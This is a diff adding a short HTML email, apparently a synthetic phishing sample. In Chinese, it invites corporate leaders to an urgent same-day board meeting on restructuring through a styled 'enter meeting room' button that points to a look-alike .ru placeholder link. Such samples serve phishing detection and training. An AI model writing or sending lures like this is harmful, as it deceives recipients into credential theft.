@@ -1,0 +1,10 @@
+From: =?utf-8?B?5pel56iL5Yqp5omL?= <cal@meet-invite2.example>
+To: leaders@corp.internal
+Date: Sun, 06 Sep 2026 09:29:00 +0800
+Message-ID: <0019-b14@synth.example>
+Subject: 董事会特别会议（今日 16:00）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p><b>特别董事会</b> 今日 16:00 讨论组织调整，请提前进入会议室：</p><a href='https://board-room-enter.example.ru/join' style='color:#fff;background:#722ed1;padding:10px 30px;text-decoration:none'>进入会议室</a><p style='font-size:12px'>建议提前 5 分钟测试音频。</p></body></html>
